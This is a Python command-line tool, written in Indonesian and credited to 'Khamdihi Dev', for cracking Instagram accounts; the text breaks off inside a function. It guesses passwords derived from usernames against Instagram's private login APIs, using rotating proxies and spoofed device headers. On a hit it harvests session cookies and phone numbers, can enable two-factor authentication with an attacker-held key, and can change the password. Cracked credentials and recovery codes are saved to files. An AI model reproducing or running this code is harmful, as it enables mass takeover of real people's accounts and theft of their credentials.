#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
- META 2024 -

Menu Premium.
Code By Khamdihi Dev - Purbalingga
"""
try:
    import re, os, uuid, sys
    import requests, bs4
    import datetime
    import hashlib, urllib
    import time, json, random, base64, datetime, platform
except Exception as e:
    exit(f'\n Error: {e}')

from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as bsp

P = "\033[97m"
I = "\033[30m"
A = "\033[90m"
H = "\033[32m"
K = H #"\033[33m"
M = K
K2 = "\033[33m"

skrg = datetime.datetime.now()
hari = skrg.day
buln = skrg.month
thun = skrg.year


class MAIN:
   banteng, prox, id, Loop, MethodType, ResultSuccess, ResultChechpoint,UbahData,info = ([], [], [], 0, [], 0, 0, [], {})
   def __init__(self):
       self.head = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',}
       super(MAIN).__init__()

   def List(self, uid):
       for me in uid:
           self.id.append(me)
       print('\n')
       print(f'{P}[{K}1{P}] Method api new')
       print(f'{P}[{K}2{P}] Method api old -> Next Update')
       print(f'{P}[{K}3{P}] Method threads\n')
       self.Main()

   def Main(self):
       while True:
         x = input(f'{P}[{K}?{P}] Pilih : {H}')
         if x in   ['01','1']: self.MethodType.append('1');break
         elif x in ['02','2']: self.MethodType.append('2');break
         elif x in ['03','3']: self.MethodType.append('3');break
       self.Exekusy()

   def Exekusy(self):
       print('')
       print(f'{P}[{K}!{P}] Auto Ubah Dan Hapus Data Akun: (Pw,Nomor,Email) [y/t]')
       x = input(f'{P}[{K}?{P}] Ubah Data : {H}').lower()
       if x in ['ya','y']:self.UbahData.append(True)
       else:self.UbahData.append(False)
       self.Exekusy2()

   #-> Generate password (username & fullname)
   def pwdc(self, nama, full):
       self.x,self.i = [], []
       for self.y in nama.split(' '):
           if len(self.y) <2:continue
           elif len(self.y) == 3 or len(self.y) == 4 or len(self.y) == 5:
              self.z = self.y.lower()
              self.x.append(self.z+'123')
              self.x.append(self.z+'1234')
              self.x.append(self.z+'12345')
           else:
              self.z = self.y.lower()
              self.x.append(self.z+'123')
              self.x.append(self.z+'1234')
              self.x.append(self.z+'12345')
           if len(nama) <5:continue
           else:
              self.x.append(nama.replace(' ','').lower())
              self.x.append(nama.lower())
           self.l = full.replace('_',' ').replace('.',' ').replace('__',' ')
           if len(self.l) <3:continue
           else:
              try:
                  self.b = self.l.split(' ')
                  for self.r in self.b:
                      if len(self.r) <3:continue
                      elif len(self.r) <5:
                         self.x.append(self.r.lower() + '123')
                         self.x.append(self.r.lower() + '1234')
                         self.x.append(self.r.lower() + '12345')
                      else:
                         self.x.append(self.r.lower() + '123')
                         self.x.append(self.r.lower() + '1234')
                         self.x.append(self.r.lower() + '12345')
                         self.x.append(self.r.lower())
              except:pass
       for self.d in self.x:
           if self.d not in self.i:
              self.i.append(self.d)
       return self.i

   def Proxies(self):
       try:
           req = requests.get('https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies').text
           for y in req.splitlines():
               if y not in self.prox:
                  self.prox.append(y)
       except:
           pass

   def Exekusy2(self):
#       if os.path.isfile('data/.keys.txt') is False:
#          exit(f'\n{P}[{K2}!{P}] Anda Tidak Memiliki License silahkan buy!')
       print(f'\n{P}[{H}!{P}] Gunakan Proxy Pada Proses Ini [y/t]')
       us_py = x = input(f'{P}[{K}?{P}] Gunakan : ').lower()
       if us_py in ['y','ya','iya']:self.Proxies()
       print(f'\n{P}[{H}!{P}] Akun {H}(OK){P} simpan di folder: {H}data/OK-Instagram.txt{P}\n[{K2}!{P}] Akun {K2}(CP){P} simpan di folder: {K2}data/CP-Instagram.txt{P}\n')
       with ThreadPoolExecutor(max_workers=30) as exe:
          for data in self.id:
              try:
                  idf, nama = data.split('|')
                  pw = self.pwdc(nama, idf)
                  if '1' in self.MethodType: exe.submit(self.Api, idf, pw)
                  elif '2' in self.MethodType: exe.submit(self.ApiOLD, idf, pw)
                  else: exe.submit(self.threads, idf, pw)
              except:pass
       if self.ResultSuccess !=0 or self.ResultChechpoint !=0:
          self.total = self.ResultSuccess + self.ResultChechpoint
          print(f'\n\n{P}[{H}★{P}] Crack Selesai...\n{P}[{H}★{P}] Anda Mendapatkan {H}{self.total} {P}Results\n\n[{H}★{P}] Akun OK: {H}{self.ResultSuccess}\n{P}[{K}★{P}] Akun CP: {K}{self.ResultChechpoint}')
       else:
          print(f'\n\n{P}[{M}!{P}] Ups Anda Tidak Mendapatkan Hasil Kali Ini 😝')
       exit(f'\n{P}[{H}*{P}] Instagram Bruteforce by : {H}Khamdihi Dev - 2024')

   def Android_ID(self, users, passwd):
       self.xyz = hashlib.md5()
       self.xyz.update(users.encode('utf-8') + passwd.encode('utf-8'))
       self.hex = self.xyz.hexdigest()
       self.xyz.update(self.hex.encode('utf-8') + '12345'.encode('utf-8'))
       return self.xyz

   #-> Ingfo
   def friends_user(self, name):
       try:
           yxz = {'Host': 'www.instagram.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'none'}
           self.head.update(yxz)
           req = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={name}', headers=self.head).json()['data']['user']
           ikut,mengikut,posting = req['edge_followed_by']['count'],req['edge_follow']['count'],req['edge_owner_to_timeline_media']['count']
           return(ikut,mengikut,posting)
       except:
           return(-1,-1,-1)

   #-> Convert cokie dict
   def Convert(self, dict_c):
       cokz = ';'.join(['%s=%s'%(x,y) for x,y in dict_c.items()])
       return cokz

   #-> Useragent Api
   def AppUac(self):
       self.anc = random.randint(100,310)
       self.xyz = random.randint(15,31)
       self.apc = random.randint(14,46)
       self.abc = random.randint(85,125)
       self.ua1 = f'Instagram {self.anc}.0.0.{self.apc}.{self.abc} Android ({self.xyz}/12; 190dpi; 1080x2020; ZTE; mooncake; ZTE-LINK; qcom; ru_RU; 323503577)'
       self.ua2 = f'Instagram {self.anc}.0.0.{self.apc}.{self.abc} Android ({self.xyz}/8.1.0; 480dpi; 1080x2102; Vargo; VX4; VX4; mt6763; pt_PT; 477443857)'
       self.ua3 = f'Instagram {self.anc}.0.0.{self.apc}.{self.abc} Android ({self.xyz}/10; 420dpi; 1440x2560; LGE/lge; LG-K720; m922; m922; en_US; 250742103)'
       self.ua4 = f'Instagram {self.anc}.0.0.{self.apc}.{self.abc} Android ({self.xyz}/10; 225dpi; 1080x2158; realme; RMX3122; RMX3122; mt6833; in_ID)'
       self.ua5 = f'Instagram {self.anc}.0.0.{self.apc}.{self.abc}(V20) Android ({self.xyz}/11; 480dpi; 1080x2139; OPPO; CPH2068; OP4C6BL1; qcom; en_US; 185203693)'
       return random.choice([self.ua1,self.ua2,self.ua3,self.ua4,self.ua5])

   # Useragent Ajax
   def AndroidUA(self):
       self.anx = random.randrange(8,15)
       self.vrs = random.randint(90,120)
       self.ua1 = f'Mozilla/5.0 (Linux; Android {self.anx}; SAMSUNG SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/{self.vrs}.0.0.0 Mobile Safari/537.3'
       self.ua2 = f'Mozilla/5.0 (Linux; Android {self.anx}; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{self.vrs}.0.6167.101 Mobile Safari/537.36 EdgA/120.0.2210.141'
       self.ua3 = f'Mozilla/5.0 (Linux; Android {self.anx}; M2010J19SI Build/QKQ1.200830.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{self.vrs}.0.4638.50 Mobile Safari/537.36'
       return random.choice([self.ua1,self.ua2,self.ua3])


   #-> Api 2023
   def Api(self, users, password):
       print(f'\r{P}[{self.Loop}/{len(self.id)}] success: {H}{self.ResultSuccess} {P}- check: {K}{self.ResultChechpoint}', end=' ');sys.stdout.flush()
       with requests.Session() as s:
         try:
             for pwb in password:
                 self.useragent   = self.AppUac()
                 self.data_config = 'signed_body=SIGNATURE.{"bool_opt_policy":"0","mobileconfig":"","api_version":"3","unit_type":"2","query_hash":"9cac9e8ac064e819d752529586fa6d0f6721b00b2884d4ead8e1f865126aa5a1","_uid":"","device_id":"%s","_uuid":"%s","fetch_type":"ASYNC_FULL"}'%(str(uuid.uuid4()),str(uuid.uuid4()))
                 self.reqs_config = s.post('https://i.instagram.com/api/v1/launcher/mobileconfig/', data=self.data_config, headers={'user-agent':self.useragent})
                 if s.cookies.get('csrftoken') is not None:
                    s.headers.update({'x-csrftoken':s.cookies.get('csrftoken')})
                 self.all_configs = {'data':{'device_id': f'android-{self.Android_ID(users,pwb).hexdigest()[:16]}','password': f'#PWD_INSTAGRAM:0:{str(int(datetime.datetime.now().timestamp()))}:{pwb}','uuid':str(uuid.uuid4())}}
                 self.data_sesion = 'params={"client_input_params":{"device_id":"'+ self.all_configs['data']['device_id'] +'","login_attempt_count":1,"secure_family_device_id":"","machine_id":"","accounts_list":[],"auth_secure_device_id":"","password":"'+ self.all_configs['data']['password'] +'","family_device_id":"'+ self.all_configs['data']['uuid'] +'","fb_ig_device_id":[],"device_emails":[],"try_num":1,"event_flow":"login_manual","event_step":"home_page","openid_tokens":{},"client_known_key_hash":"","contact_point":"'+ users +'","encrypted_msisdn":""},"server_params":{"username_text_input_id":"vhjfgy:52","device_id":"'+ self.all_configs['data']['device_id'] +'","should_trigger_override_login_success_action":0,"server_login_source":"login","waterfall_id":"'+ self.all_configs['data']['uuid'] +'","login_source":"Login","INTERNAL__latency_qpl_instance_id":190391144200130,"reg_flow_source":"login_home_native_integration_point","is_platform_login":0,"is_caa_perf_enabled":1,"credential_type":"password","family_device_id":"'+ self.all_configs['data']['uuid'] +'","INTERNAL__latency_qpl_marker_id":36707139,"offline_experiment_group":"caa_launch_ig4a_combined_60_percent","INTERNAL_INFRA_THEME":"default","password_text_input_id":"vhjfgy:53","qe_device_id":"'+ self.all_configs['data']['uuid'] +'","ar_event_source":"login_home_page"}}&                                    bk_client_context={"bloks_version":"8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb","styles_id":"instagram"}&bloks_versioning_id=8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb'
                 s.headers.update({
                      'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
                      'x-ig-app-locale': 'in_ID',
                      'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
                      'x-ig-device-locale': 'in_ID',
                      'x-ig-android-id': self.all_configs['data']['device_id'],
                      'x-ig-mapped-locale': 'id_ID',
                      'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                      'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
                      'x-ig-device-id': self.all_configs['data']['uuid'],
                      'x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb',
                      'x-ig-timezone-offset': str(-time.timezone),
                      'x-ig-connection-type': 'MOBILE(LTE)',
                      'x-ig-capabilities': '3brTv10=',
                      'x-pigeon-session-id': f'UFS-{self.all_configs["data"]["uuid"]}-0',
                      'x-ig-app-id': '567067343352427',
                      'priority': 'u=3',
                      'user-agent': self.useragent,
                      'accept-language': 'id-ID, en-US',
                      'x-bloks-is-layout-rtl': 'false',
                      'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                      'Host': 'i.instagram.com',
                      'x-fb-http-engine': 'Liger',
                      'x-ig-family-device-id': self.all_configs['data']['uuid'],
                      'x-fb-client-ip': 'True',
                      'x-fb-server-cluster': 'True',
                      'x-fb-connection-type': 'MOBILE.LTE',
                      'connection': 'keep-alive',
                      'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),})
                 if len(self.prox) > 0:
                    socks = {'http': 'http://' + random.choice(self.prox)}
                    req = s.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data = self.data_sesion, proxies=socks, allow_redirects = True)
                 else:
                    req = s.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data = self.data_sesion, allow_redirects = True)
                    print(req.text)
                 if 'Bearer IGT:2:' in str(req.text.replace('\\','')):
                      cokie = {}
                      try:
                          nomor = re.search('"phone_number":"(.*?)"',str(req.text.replace('\\',''))).group(1)
                          cok = re.search('"headers":"{"IG-Set-Authorization": "(.*?)"', str(req.text.replace('\\',''))).group(1)
                          xyz = base64.b64decode(cok.split(':')[2]).decode()
                          ds_id = re.search('{"ds_user_id":"(\d+)"', str(xyz)).group(1)
                          sn_id = re.search('"sessionid":"(.*?)"', str(xyz)).group(1)
                          cokie.update({"ds_user_id":f"{ds_id}","sessionid":f"{sn_id}"})
                          cokie.update(s.cookies.get_dict())
                      except Exception as e:
                         cokie = 'Cokie Tidak Ada'
                         nomor = 'Nomor Tidak Ada'
                      if nomor == '' or nomor == 'Nomor Tidak Ada':
                         nomor = 'Nomor Tidak Ada'
                      if cokie == 'Cokie Tidak Ada':
                         cookie = 'Cokie Tidak Ada'
                      else:
                         cookie = self.Convert(cokie)
                      followers, following, postingan = self.friends_user(users)
                      if True in self.UbahData:
                         self.a2f = self.TahapPertama2f(cookie)
                         self.cex = 'A2F Di Aktifkan' if self.a2f['success-a2f'] is True else 'A2F Tidak Aktif'
                         self.aut = self.a2f['SecretKey']
                         self.pem = self.a2f['kode-pemulihan']
                         self.pwx = self.RePassword(cookie, pwb)
                         self.abc = self.pwx if self.pwx is not None else pwb
                         print(f'''\r                                                                     
 {P}• {H}Success Login
 {P}• {H}{users}|{self.abc}
 {P}• {H}{nomor}
 {P}• {H}{self.cex}
 {P}• {H}{self.aut}
 {P}• {H}{self.pem}
 {P}• {H}{followers}/{following}/{postingan}
 {P}• {H}{cookie}''')
                      else:
                         print(f'''\r                                               
 {P}• {H}Success
 {P}• {H}{users}|{pwb}
 {P}• {H}{nomor}
 {P}• {H}{followers}/{following}/{postingan}
 {P}• {H}{cookie}''')
                         self.aut = None
                         self.pem = None
                         self.abc = pwb
                         self.cex = None
                      date = {
'user':users,
'pasw':self.abc,
'auth':self.aut,
'kuki':cookie,
'ikut':followers,
'melu':following,
'kode':self.pem,
'twof':self.cex
}
                      self.SaveHas(date, True)
                      self.ResultSuccess +=1
                      break
                 elif 'https://i.instagram.com/challenge' in str(req.text.replace('\\','')):
                      followers, following, postingan = self.friends_user(users)
                      print(f'''\r                                            
 {P}• {K2}Check
 {P}• {K2}{users}|{pwb}
 {P}• {K2}{followers}/{following}/{postingan}''')
                      date = {'user':users,'pasw':pwb,'ikut':followers,'melu':following,}
                      self.SaveHas(date, False)
                      self.ResultChechpoint +=1
                      break
             self.Loop +=1
         except requests.exceptions.ConnectionError:
             time.sleep(10)

   def threads(self, users, password):
       print(f'\r{P}[{self.Loop}/{len(self.id)}] success: {H}{self.ResultSuccess} {P}- check: {K}{self.ResultChechpoint}', end=' ');sys.stdout.flush()
       with requests.Session() as s:
         try:
             for pwb in password:
                 self.useragent   = self.AppUac()
                 self.data_config = 'signed_body=SIGNATURE.{"bool_opt_policy":"0","mobileconfig":"","api_version":"3","unit_type":"2","query_hash":"9cac9e8ac064e819d752529586fa6d0f6721b00b2884d4ead8e1f865126aa5a1","_uid":"","device_id":"%s","_uuid":"%s","fetch_type":"ASYNC_FULL"}'%(str(uuid.uuid4()),str(uuid.uuid4()))
                 self.reqs_config = s.post('https://i.instagram.com/api/v1/launcher/mobileconfig/', data=self.data_config, headers={'user-agent':self.useragent})
                 self.all_configs = {'data':{'device_id': f'android-{self.Android_ID(users,pwb).hexdigest()[:16]}','password': f'#PWD_INSTAGRAM:0:{str(int(datetime.datetime.now().timestamp()))}:{pwb}','uuid':str(uuid.uuid4())}}
                 self.data_thread = {
                     "client_input_params": {
                     "device_id": self.all_configs['data']['device_id'],
                     "login_attempt_count": 1,
                     "secure_family_device_id": "",
                     "machine_id": "",
                     "accounts_list": [],
                     "auth_secure_device_id": "",
                     "password": self.all_configs['data']['password'],
                     "family_device_id": self.all_configs['data']['uuid'],
                     "fb_ig_device_id": [],
                     "device_emails": [],
                     "try_num": 1,
                     "event_flow": "login_manual",
                     "event_step": "home_page",
                     "openid_tokens": {},
                     "client_known_key_hash": "",
                     "contact_point": f"{users}",
                     "encrypted_msisdn": "",
                 },
                     "server_params": {
                     "should_trigger_override_login_2fa_action": 0,
                     "username_text_input_id": "v7chy0:53",
                     "device_id": self.all_configs['data']['device_id'],
                     "should_trigger_override_login_success_action": 0,
                     "server_login_source": "login",
                     "waterfall_id": self.all_configs['data']['uuid'],
                     "login_source": "Login",
                     "INTERNAL__latency_qpl_instance_id": 188679189600332,
                     "reg_flow_source": "login_home_native_integration_point",
                     "is_platform_login": 0,
                     "is_caa_perf_enabled": 1,
                     "credential_type": "password",
                     "family_device_id": self.all_configs['data']['uuid'],
                     "INTERNAL__latency_qpl_marker_id": 36707139,
                     "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
                     "INTERNAL_INFRA_THEME": "harm_f",
                     "password_text_input_id": "v7chy0:54",
                     "qe_device_id": self.all_configs['data']['uuid'],
                     "ar_event_source": "login_home_page",
                    }
                 }
                 self.sign = 'params='+ urllib.parse.quote(str(self.data_thread)) +'&bk_client_context={"bloks_version":"9de54335a516a20dc08018bc3a317ec1a859821fe610ed57b5994052d68f92e6","styles_id":"instagram"}&bloks_versioning_id=9de54335a516a20dc08018bc3a317ec1a859821fe610ed57b5994052d68f92e6'
                 self.head = {'user-agent': self.AppUac(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'connection': 'keep-alive', 'x-ig-bandwidth-totalbytes-b': '0', 'x-ig-app-locale': 'in_ID', 'x-ig-bandwidth-speed-kbps': '-1.000', 'x-ig-device-locale': 'in_ID', 'x-ig-android-id': self.all_configs['data']['device_id'], 'x-ig-mapped-locale': 'id_ID', 'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()), 'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)), 'x-ig-device-id': self.all_configs['data']['uuid'], 'x-bloks-version-id': '9de54335a516a20dc08018bc3a317ec1a859821fe610ed57b5994052d68f92e6', 'x-ig-timezone-offset': str(-time.timezone), 'x-ig-connection-type': 'MOBILE(LTE)', 'x-ig-capabilities': '3brTv10=', 'x-pigeon-session-id': f'UFS-{self.all_configs["data"]["uuid"]}-0', 'x-ig-app-id': '567067343352427', 'priority': 'u=3', 'accept-language': 'id-ID, en-US', 'x-bloks-is-layout-rtl': 'false', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Host': 'i.instagram.com', 'x-fb-http-engine': 'Liger', 'x-ig-family-device-id': self.all_configs['data']['uuid'], 'x-fb-client-ip': 'True', 'x-fb-server-cluster': 'True', 'x-fb-connection-type': 'MOBILE.LTE'}
                 if len(self.prox) > 0:
                    socks = {'http': 'socks5://' + random.choice(self.prox)}
                    self.reqs = s.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=self.sign, headers=self.head, proxies=socks, allow_redirects = True)
                 else:
                    self.reqs = s.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=self.sign, headers=self.head, allow_redirects=True)
                 if 'Bearer IGT:2:' in str(self.reqs.text.replace('\\','')):
                      cokie = {}
                      try:
                          nomor = re.search('"phone_number":"(.*?)"',str(self.reqs.text.replace('\\',''))).group(1)
                          cok = re.search('"headers":"{"IG-Set-Authorization": "(.*?)"', str(self.reqs.text.replace('\\',''))).group(1)
                          xyz = base64.b64decode(cok.split(':')[2]).decode()
                          ds_id = re.search('{"ds_user_id":"(\d+)"', str(xyz)).group(1)
                          sn_id = re.search('"sessionid":"(.*?)"', str(xyz)).group(1)
                          cokie.update({"ds_user_id":f"{ds_id}","sessionid":f"{sn_id}"})
                          cokie.update(s.cookies.get_dict())
                      except Exception as e:
                         cokie = None
                         nomor = 'Nomor Tidak Ada'
                      if nomor == '' or nomor == 'Nomor Tidak Ada':
                         nomor = 'Nomor Tidak Ada'
                      if cokie is None:
                         cookie = 'Cokie Tidak Ada'
                      else:
                         cookie = self.Convert(cokie)
                      followers, following, postingan = self.friends_user(users)
                      if True in self.UbahData:
                         self.a2f = self.TahapPertama2f(cookie)
                         self.cex = 'A2F Di Aktifkan' if self.a2f['success-a2f'] is True else 'A2F Tidak Aktif'
                         self.aut = self.a2f['SecretKey']
                         self.pem = self.a2f['kode-pemulihan']
                         self.pwx = self.RePassword(cookie, pwb)
                         self.abc = self.pwx if self.pwx is not None else pwb
                         print(f'''\r                                                          
 {P}• {H}Success Login
 {P}• {H}{users}|{self.abc}
 {P}• {H}{nomor}
 {P}• {H}{self.cex}
 {P}• {H}{self.aut}
 {P}• {H}{self.pem}
 {P}• {H}{followers}/{following}/{postingan}
 {P}• {H}{cookie}''')
                      else:
                         print(f'''\r                                                                     
 {P}• {H}Success Login
 {P}• {H}{users}|{pwb}
 {P}• {H}{nomor}
 {P}• {H}{followers}/{following}/{postingan}
 {P}• {H}{cookie}''')
                         self.aut = None
                         self.pem = None
                         self.abc = pwb
                         self.cex = None
                      date = {
'user':users,
'pasw':self.abc,
'auth':self.aut,
'kuki':cookie,
'ikut':followers,
'melu':following,
'kode':self.pem,
'twof':self.cex
}
                      self.SaveHas(date, True)
                      self.ResultSuccess +=1
                      break
                 elif 'https://i.instagram.com/challenge' in str(self.reqs.text.replace('\\','')):
                      followers, following, postingan = self.friends_user(users)
                      print(f'''\r                                            
 {P}• {K2}Check
 {P}• {K2}{users}|{pwb}
 {P}• {K2}{followers}/{following}/{postingan}''')
                      date = {'user':users,'pasw':pwb,'ikut':followers,'melu':following,}
                      self.SaveHas(date, False)
                      self.ResultChechpoint +=1
                      break
             self.Loop +=1
         except (AttributeError,requests.exceptions.ConnectionError):
             time.sleep(10)

   def ApiOLD(self, users, password):
       print(f'\r{P}[{self.Loop}/{len(self.id)}] success: {H}{self.ResultSuccess} {P}- check: {K2}{self.ResultChechpoint}', end=' ');sys.stdout.flush()
       with requests.Session() as s:
         try:
             for pwb in password:
                 self.fxcal = 'aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9meGNhbC9hdXRoL2xvZ2luLz9hcHBfaWQ9MTIxNzk4MTY0NDg3OTYyOCZldG9rZW49QWJpOVVCUlFWZHQ0RDlhbVVUU0kyWGg2YXNGanlCaFZTUXJNNnliUUc0T0I3NklWdXdVNTVvLVkwYmlDOVo1NDZJaHFXenMwMlhYeWd4cVFZaEF2a1VlLUFtRjc2SHBCc2xIRENrWWdVM1lSa2VIOGkzZkRXcHQ3Jm5leHQ9aHR0cHMlM0ElMkYlMkZhY2NvdW50c2NlbnRlci5pbnN0YWdyYW0uY29tJTJGJTNGYXV0aF9mbG93JTNEbG9naW5fbm9fcGlu'
                 self.jomok = requests.Session().get(base64.b64decode(self.fxcal))
                 self.data = {'csrftoken': self.jomok.cookies['csrftoken']}
                 self.kueh = ';'.join(['%s=%s'%(x, y) for x,y in self.jomok.cookies.items()])
                 self.head = {
'Host': 'www.instagram.com',
'sec-ch-ua': 'Not_A',
'x-ig-www-claim': re.search('"claim":"(.*?)"}', self.jomok.text).group(1),
'sec-ch-ua-platform-version': '',
'x-requested-with': 'XMLHttpRequest',
'sec-ch-ua-full-version-list': "Not_A",
'x-csrftoken': self.data['csrftoken'],
'sec-ch-ua-model': '',
'sec-ch-ua-platform': 'Android',
'x-ig-app-id': re.search('{"app_id":(\d+),', self.jomok.text).group(1),
'x-fb-connection-type': 'MOBILE.LTE',
'x-ig-android-id': f'android-{self.Android_ID(users,pwb).hexdigest()[:16]}',
'connection': 'keep-alive',
'sec-ch-prefers-color-scheme': 'light',
'sec-ch-ua-mobile': '?1',
'x-instagram-ajax': re.search('"rollout_hash":"(\d+)"', self.jomok.text).group(1),
'user-agent': self.AndroidUA(),
'viewport-width': '360',
'content-type': 'application/x-www-form-urlencoded',
'accept': '*/*',
'x-asbd-id': '129477',
'origin': 'https://www.instagram.com',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': self.jomok.url,
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                 self.Meta = {
'enc_password':f'#PWD_INSTAGRAM_BROWSER:0:{str(int(time.time()))}:{pwb}',
'etoken':re.search('"etoken":"(.*?)"', self.jomok.text).group(1),
'username':users}
                 self.Resp = s.post('https://www.instagram.com/api/v1/web/fxcal/auth/login/ajax/', cookies={'cookie':self.kueh}, data=self.Meta, headers=self.head)
                 if '"authenticated":true,' in str(self.Resp.text):
                    self.ResultSuccess +=1
                    print(f'''\r                                        
 {P}• {H}Success Login
 {P}• {H}{users}|{pwb}
 {P}• {H}{self.Resp.cookies.get_dict()}
 {P}• {H}{s.cookies.get_dict()}''')
                    break
                 elif 'checkpoint_url' in str(self.Resp.text):
                    print(f'{users}|{pwb}')
                    break
             self.Loop +=1
         except Exception as e:print(e)

   def SaveHas(self, data, akun):
       if akun is True:
          nama = data['user']
          pasw = data['pasw']
          auth = data['auth']
          kode = data['kode']
          coki = data['kuki']
          ikut = data['ikut']
          melu = data['melu']
          ftor = data['twof']
          dire = 'data/OK-Instagram_dibawah_100.txt' if int(ikut) <100 else 'data/OK-Instagram_diatas_100.txt'
          with open(dire, 'a', encoding='utf-8') as xyz:
             xyz.write(f'\n • Username  : {nama}\n • Password  : {pasw}\n • Followers : {ikut}\n • Following : {melu}\n • Kode Auth : {auth}\n • Pemulihan : {kode}\n • Status 2F : {ftor}\n • Cookie    : {coki}\n')
             xyz.close()
          return 0
       else:
          nama = data['user']
          pasw = data['pasw']
          ikut = data['ikut']
          melu = data['melu']
          dire = 'data/CP-Instagram_dibawah_100.txt' if int(ikut) <100 else 'data/CP-Instagram_diatas_100.txt'
          with open(dire, 'a', encoding='utf-8') as xyz:
             xyz.write(f'\n • Username  : {nama}\n • Password  : {pasw}\n • Followers : {ikut}\n • Following : {melu}\n')
             xyz.close()
          return 0

   def data_graph(self, xxx):
       data = {
           'av': re.search('{"actorID":"(\d+)"', str(xxx)).group(1),
           '__user': '0',
           '__a':'1',
           '__hs': re.search('"haste_session":"(.*?)"', str(xxx)).group(1),
           'dpr': '2',
           '__ccg': 'GOOD',
           '__rev': re.search('{"consistency":{"rev":(\d+)}', str(xxx)).group(1),
           '__hsi': re.search('"hsi":"(\d+)"', str(xxx)).group(1),
           '__comet_req': re.search('__comet_req=(\d+)', str(xxx)).group(1),
           'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(xxx)).group(1),
           'jazoest': re.search('jazoest=(\d+)', str(xxx)).group(1),
           'lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
           '__spin_r': re.search('"__spin_r":(\d+)', str(xxx)).group(1),
           '__spin_b': 'trunk',
           '__spin_t': re.search('"__spin_t":(\d+)', str(xxx)).group(1),
           'fb_api_caller_class': 'RelayModern',
           'fb_api_req_friendly_name': 'PolarisPostCommentsContainerQuery',
           'server_timestamps': 'true',
           'doc_id': '6888165191230459'
       }
       return(data)

   def headers_graph(self, xxx):
       xyz     = 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 191.0.0.25.122 (iPhone13,1; iOS 14_4_2; en_CA; en-CA; scale=2.88; 1080x2338; 296543649) NW/3'
       headers = {'Host': 'accountscenter.instagram.com','x-ig-app-id': '936619743392459','user-agent': xyz,}
       return(headers)

   def TahapPertama2f(self, cokie, url = 'https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point'):
       try:
           resp = requests.Session().get(url, cookies = {'cookie': cokie}).text
           head = self.headers_graph(resp)
           head.update({
               'x-fb-friendly-name': 'useFXSettingsTwoFactorGenerateTOTPKeyMutation',
               'content-type': 'application/x-www-form-urlencoded',
               'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(resp)).group(1),
           })
           data = self.data_graph(resp)
           data.update({
               'fb_api_caller_class':'RelayModern',
               'fb_api_req_friendly_name':'useFXSettingsTwoFactorGenerateTOTPKeyMutation',
               'variables':json.dumps({"input":{"client_mutation_id":f"{self.ClientId(resp)}","actor_id":f"{self.AccountId(resp)}","account_id":f"{self.AccountId(resp)}","account_type":"INSTAGRAM","device_id":"device_id_fetch_ig_did","fdid":"device_id_fetch_ig_did"}}),
               'doc_id':'6282672078501565',
           })
           get_p = requests.post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies = {'cookie':cokie}).text
           if "totp_key" in str(get_p):
              xnxx = re.search('"key_text":"(.*?)"', str(get_p)).group(1)
              hpsx = xnxx.replace(' ','')
              kode = requests.get(f'https://2fa.live/tok/{hpsx}').json()['token']
              self.info.update({'SecretKey':hpsx})
              self.AktifkanA2f(cokie, kode, resp, hpsx)
           else:
              self.info.update({'SecretKey':'Kode Authentikasi Tidak Ada'})
              self.info.update({'success-a2f':False})
              self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
       except Exception as e:
          self.info.update({'SecretKey':'Kode Authentikasi Tidak Ada'})
          self.info.update({'success-a2f':False})
          self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
       return self.info

   def AktifkanA2f(self, cokie, code, resp, auth):
       try:
